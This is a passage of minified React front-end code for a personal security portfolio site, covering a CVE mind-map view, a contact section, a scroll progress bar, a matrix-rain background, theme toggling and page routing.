b=((T||"").match(/\d/g)||[]).reduce((I,M)=>I+Number(M),0),E=["Low","Medium","High","Critical"];return E[b%E.length]},S=T=>T==="Critical"?9.4:T==="High"?8.1:T==="Medium"?6:4;return ao.filter(T=>p(T.title)).map(T=>{const v=T.title.match(/CVE[-–](\d{4})[-–]?([\d]+)/i),b=v?`CVE-${v[1]}-${v[2]}`:T.slug.toUpperCase(),E=m(b);return{id:b,title:T.title,severity:E,cvss:S(E),year:f(T.date),kev:!1,summary:T.excerpt,href:T.href||`/blog/${T.slug}`}})},[]),s=C.useMemo(()=>zw(t,e),[t,e]),[r,i]=C.useState(null),[a,l]=C.useState([]),[o,c]=C.useState(0),[u,d]=C.useState(null),[h,y]=C.useState(null),[k,x]=C.useState(""),L=p=>{i(p),x((p==null?void 0:p.id)||"")};return g.jsxs("div",{className:"cve-fullscreen",children:[g.jsx("div",{className:"mindmap-watermark","aria-hidden":"true",children:"CVE // MIND MAP"}),g.jsxs("div",{className:"mindmap-stage mindmap-shell",children:[g.jsxs("div",{className:"mode-icon-bar","aria-hidden":"true",children:[g.jsx("button",{className:`mode-icon ${e==="year"?"active":""}`,onClick:()=>n("year"),title:"Group by year",children:g.jsx("span",{className:"icon glyph-years"})}),g.jsx("button",{className:`mode-icon ${e==="severity"?"active":""}`,onClick:()=>n("severity"),title:"Group by severity",children:g.jsx("span",{className:"icon glyph-severity"})})]}),g.jsxs("div",{className:"mindmap-canvas",children:[g.jsx(Iw,{data:s,onSelectCve:L,onFocusPath:l,highlightId:k,onHover:p=>{var f,m;d((p==null?void 0:p.node)||null),p&&p.screen?y({name:p.node.name,title:((f=p.node.info)==null?void 0:f.title)||p.node.name,href:(m=p.node.info)==null?void 0:m.href,x:p.screen.x,y:p.screen.y}):y(null)},hoveredId:u==null?void 0:u.id},o),h&&g.jsxs("div",{className:"mindmap-preview",style:{left:h.x,top:h.y},children:[g.jsx("div",{className:"preview-title",children:h.title}),h.href?g.jsx("a",{href:h.href,target:"_blank",rel:"noreferrer",children:"open blog"}):null]})]})]}),g.jsx(iy,{cve:r,onClose:()=>i(null)})]})}function jw(){const e="hemparekh1596@gmail.com",[n,t]=C.useState(!1),s=()=>{navigator.clipboard&&navigator.clipboard.writeText(e).then(()=>{t(!0),setTimeout(()=>t(!1),1800)}).catch(()=>{})};return g.jsx("section",{className:"contact-strip",id:"contact",children:g.jsxs("div",{className:"container contact-grid",children:[g.jsxs("div",{children:[g.jsx("p",{className:"pill",children:"Let’s talk"}),g.jsx("h2",{children:"Signal received. Drop a note and let’s build secure systems."}),g.jsx("p",{className:"contact-blurb",children:"Let’s connect to collaborate on security engineering or privacy-focused initiatives."}),n&&g.jsx("p",{className:"contact-blurb",children:"Copied. Channel armed with end-to-end noise."})]}),g.jsxs("div",{className:"contact-actions",children:[g.jsx("button",{className:"button primary",onClick:s,type:"button",children:"Copy Email"}),g.jsx("a",{className:"button ghost",href:"https://www.linkedin.com/in/hem-parekh/",target:"_blank",rel:"noreferrer",children:"LinkedIn"}),g.jsx("a",{className:"button ghost",href:"https://github.com/Hem1700",target:"_blank",rel:"noreferrer",children:"GitHub"})]})]})})}function Bw(){const[e,n]=C.useState(0);return C.useEffect(()=>{const t=()=>{const{scrollTop:s,scrollHeight:r,clientHeight:i}=document.documentElement,a=r>i?s/(r-i)*100:0;n(Math.min(100,Math.max(0,a)))};return t(),window.addEventListener("scroll",t,{passive:!0}),()=>window.removeEventListener("scroll",t)},[]),g.jsx("div",{className:"scroll-progress",children:g.jsx("div",{className:"scroll-progress__bar",style:{width:`${e}%`}})})}function Fw(){const[e,n]=C.useState(!1);return C.useEffect(()=>{const t=()=>n(window.scrollY>400);return window.addEventListener("scroll",t,{passive:!0}),t(),()=>window.removeEventListener("scroll",t)},[]),e?g.jsx("button",{className:"back-to-top",type:"button","aria-label":"Back to top",title:"Back to top",onClick:()=>window.scrollTo({top:0,behavior:"smooth"}),children:"↑"}):null}function Uw(){const e=C.useRef(null),n=C.useRef(null);return C.useEffect(()=>{const t=e.current;if(!t)return()=>{};const s=t.getContext("2d");let r=t.width=window.innerWidth,i=t.height=window.innerHeight;const a=16;let l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:.5+Math.random()*.9}));const c="アカサタナハマヤラワ0123456789日田由止育宇禾水火木金土文ﾊﾐﾋﾑﾍﾎｱｶｻﾀﾅﾊﾏ",u=()=>{s.fillStyle="rgba(0, 0, 0, 0.12)",s.fillRect(0,0,r,i),s.font=`${a}px "IBM Plex Mono", monospace`,o.forEach((h,y)=>{const k=c[Math.floor(Math.random()*c.length)],x=y*a,L=h.y*a;s.fillStyle="rgba(200, 200, 200, 0.9)",s.fillText(k,x,L),s.fillStyle="rgba(200, 200, 200, 0.18)",s.fillText(k,x,L-a),h.y+=h.speed,h.y*a>i&&Math.random()>.95&&(h.y=0,h.speed=.5+Math.random()*.9)}),n.current=requestAnimationFrame(u)},d=()=>{r=t.width=window.innerWidth,i=t.height=window.innerHeight,l=Math.floor(r/a),o=Array.from({length:l},()=>({y:Math.random()*20,speed:1+Math.random()*2}))};return window.addEventListener("resize",d),u(),()=>{window.removeEventListener("resize",d),n.current&&cancelAnimationFrame(n.current)}},[]),g.jsx("canvas",{ref:e,className:"matrix-rain","aria-hidden":"true"})}function Hw(){const[e,n]=C.useState(()=>typeof window>"u"?"light":localStorage.getItem("theme")||"light");return C.useEffect(()=>{const s=document.body;s.classList.remove("light","dark"),s.classList.add(e),localStorage.setItem("theme",e)},[e]),{theme:e,toggleTheme:()=>{n(s=>s==="light"?"dark":"light")}}}function Vw(){const{theme:e,toggleTheme:n}=Hw(),[t,s]=C.useState(!0),[r,i]=C.useState(!0),a=C.useCallback((o,c)=>{const u=document.body;u&&(o?u.classList.remove("hud-scanlines-off"):u.classList.add("hud-scanlines-off"),c?u.classList.remove("hud-noise-off"):u.classList.add("hud-noise-off"))},[]);C.useEffect(()=>{try{const o=localStorage.getItem("hud:scanlines")!=="off",c=localStorage.getItem("hud:noise")!=="off";s(o),i(c),a(o,c)}catch{a(!0,!0)}},[a]),C.useEffect(()=>{try{localStorage.setItem("hud:scanlines",t?"on":"off"),localStorage.setItem("hud:noise",r?"on":"off")}catch{}a(t,r)},[t,r,a]);const l=C.useCallback(()=>{if(typeof window<"u"){window.dispatchEvent(new CustomEvent("hud:reset-layout",{detail:"all"}));try{Object.keys(localStorage).filter(o=>o.startsWith("hud:window:")||o.startsWith("hud:")).forEach(o=>localStorage.removeItem(o))}catch{}}},[]);return C.useEffect(()=>{const o=c=>{if(!((c.ctrlKey||c.metaKey)&&c.shiftKey))return;const u=c.key.toLowerCase();u==="r"&&(c.preventDefault(),l()),u==="s"&&(c.preventDefault(),s(d=>!d)),u==="n"&&(c.preventDefault(),i(d=>!d))};return window.addEventListener("keydown",o),()=>window.removeEventListener("keydown",o)},[l]),g.jsx(Cg,{children:g.jsxs("div",{className:"app-shell",children:[g.jsx(Uw,{}),g.jsx(Bw,{}),g.jsx(Ng,{onToggleTheme:n,theme:e}),g.jsx("main",{children:g.jsxs(kg,{children:[g.jsx(kn,{path:"/",element:g.jsx(Ic,{})}),g.jsx(kn,{path:"/blogs",element:g.jsx(jg,{})}),g.jsx(kn,{path:"/projects",element:g.jsx(sy,{})}),g.jsx(kn,{path:"/certifications",element:g.jsx(ry,{})}),g.jsx(kn,{path:"/blog/:slug",element:g.jsx(ty,{})}),g.jsx(kn,{path:"/cve-map",element:g.jsx(Dw,{})}),g.jsx(kn,{path:"*",element:g.jsx(Ic,{})})]})}),g.jsx(jw,{}),g.jsx(Rg,{}),g.jsx(Fw,{})]})})}hd(document.getElementById("root")).render(g.jsx(uu.StrictMode,{children:g.jsx(Vw,{})}));
